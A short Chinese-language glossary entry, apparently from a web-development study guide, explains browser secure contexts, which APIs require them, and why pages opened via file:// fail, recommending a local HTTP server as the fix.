**安全上下文（secure context）**指页面通过 HTTPS（或 `localhost`、`127.0.0.1` 等被认定为「可能可信」的来源）加载；只有在这种环境下，一大批敏感 API 才存在：`navigator.clipboard`、`crypto.subtle`、`navigator.geolocation`、Service Worker、`navigator.storage.persist()`、`getUserMedia` 等。**`file://` 协议**是最容易踩坑的场景：直接双击打开 HTML 文件时，每个文件被视为**独立的不透明源**，于是 ESM 的 `import` 被 CORS 拦下、`fetch` 本地文件失败、`localStorage`/Cookie 行为不一致或被禁用、Service Worker 与剪贴板 API 不可用。关键细节：解决办法不是关掉安全策略，而是**起一个本地 HTTP 服务**（`npx serve`、`python -m http.server`）。**常见误解**：以为「浏览器把文件当同源」——它在很多实现里恰恰是**最严格**的隔离。

也见 [Same-Origin Policy & Cross-Origin（同源策略与跨域）](#same-origin-policy-cross-origin同源策略与跨域)、[CORS（跨域资源共享）](#cors跨域资源共享)、[Clipboard API & User Gesture（剪贴板与用户手势）](#clipboard-api-user-gesture剪贴板与用户手势)。

示例：[`27_web_apis/08_browser_modules.js`](27_web_apis/08_browser_modules.js)、[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)
